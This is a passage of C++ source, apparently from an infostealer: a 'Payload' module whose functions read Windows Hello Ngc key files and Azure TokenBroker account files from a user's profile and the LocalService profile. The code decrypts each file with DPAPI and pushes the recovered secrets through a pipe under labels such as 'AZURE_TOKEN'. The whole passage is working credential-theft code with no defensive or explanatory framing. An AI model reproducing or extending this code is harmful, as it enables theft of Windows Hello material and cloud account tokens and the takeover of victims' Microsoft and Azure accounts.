                            if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty())

                            {

                                std::string filePathStr = entry.path().string();

                                std::string dataHex = BytesToHex(decrypted);

                                m_pipe.Log("WINDOWS_HELLO:" + filePathStr + "|" + dataHex);

                                anyFound = true;

                            }

                        }

                    }

                    catch (const std::exception& e)

                    {

                        // Capture path before catch (this was the bug)

                        std::string currentPath = "<unknown_path>";

                        // Note: We can't easily get the current entry here in all compilers,

                        // so we log a general directory error instead

                        std::string err = "WINDOWS_HELLO_DIR_ERROR: " + ngcDir.string() + " | " + e.what();

                        m_pipe.Log(err);

                        if (errorDetails.empty()) errorDetails = err;

                    }

                    catch (...)

                    {

                        std::string err = "WINDOWS_HELLO_DIR_ERROR: " + ngcDir.string() + " | unknown exception";

                        m_pipe.Log(err);

                        if (errorDetails.empty()) errorDetails = err;

                    }

                };

            // 1. Current user’s Ngc folder

            char localAppData[MAX_PATH] = {};

            HRESULT hr = SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);

            if (SUCCEEDED(hr))

            {

                processNgcDir(std::filesystem::path(localAppData) / "Microsoft" / "Ngc");

            }

            else

            {

                errorDetails += "SHGetFolderPathA failed (HRESULT: " + std::to_string(hr) + "); ";

            }

            // 2. LocalService Ngc folder

            processNgcDir(R"(C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc)");

        }

        catch (const std::exception& e)

        {

            std::string err = "WINDOWS_HELLO_ERROR: " + std::string(e.what());

            m_pipe.Log(err);

            errorDetails = err;

        }

        catch (...)

        {

            std::string err = "WINDOWS_HELLO_ERROR: unknown exception";

            m_pipe.Log(err);

            errorDetails = err;

        }

        // Final result

        if (!anyFound)

        {

            if (!errorDetails.empty())

                m_pipe.Log("NO_WINDOWS_HELLO|" + errorDetails);

            else

                m_pipe.Log("NO_WINDOWS_HELLO");

        }

    }





    void ExtraExtractor::CollectAzureTokens()

    {

        bool anyFound = false;

        std::string errorDetails;

        try

        {

            char localAppData[MAX_PATH] = {};

            if (FAILED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData)))

            {

                m_pipe.Log("NO_AZURE_TOKENS|SHGetFolderPathA (CSIDL_LOCAL_APPDATA) failed");

                return;

            }

            std::filesystem::path tokenDir =

                std::filesystem::path(localAppData) / "Microsoft" / "TokenBroker" / "Accounts";

            if (!std::filesystem::exists(tokenDir))

            {

                m_pipe.Log("NO_AZURE_TOKENS|TokenBroker\\Accounts directory not found");

                return;

            }

            for (const auto& accountDir : std::filesystem::directory_iterator(tokenDir))

            {

                if (!accountDir.is_directory())

                    continue;

                for (const auto& file : std::filesystem::directory_iterator(accountDir))

                {

                    if (!file.is_regular_file())

                        continue;

                    std::ifstream f(file.path(), std::ios::binary);

                    if (!f) continue;

                    std::vector<BYTE> blob(

                        (std::istreambuf_iterator<char>(f)),

                        std::istreambuf_iterator<char>());

                    std::string decrypted = DPAPIDecrypt(blob);

                    if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty())

                    {

                        m_pipe.Log("AZURE_TOKEN:" + file.path().string() + "|" + decrypted);

                        anyFound = true;

                    }

                }

            }

        }

        catch (const std::exception& e)

        {

            std::string err = "AZURE_TOKEN_ERROR: " + std::string(e.what());

            m_pipe.Log(err);

            errorDetails = err;

        }

        catch (...)

        {

            std::string err = "AZURE_TOKEN_ERROR: unknown exception";

            m_pipe.Log(err);

            errorDetails = err;

        }

        if (!anyFound)

        {

            if (!errorDetails.empty())

                m_pipe.Log("NO_AZURE_TOKENS|" + errorDetails);

            else

                m_pipe.Log("NO_AZURE_TOKENS");

        }

    }




} // namespace Payload